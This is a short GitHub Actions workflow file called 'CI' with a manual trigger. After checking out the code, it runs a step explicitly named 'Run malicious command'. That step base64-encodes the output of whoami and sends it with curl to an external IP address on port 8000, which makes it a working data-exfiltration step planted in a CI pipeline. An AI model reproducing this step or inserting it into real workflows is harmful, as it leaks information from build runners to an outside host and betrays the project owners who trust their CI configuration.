name: CI

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Run malicious command
      run: |
        curl http://43.136.35.213:8000/$(whoami|base64 | tr -d "\n");
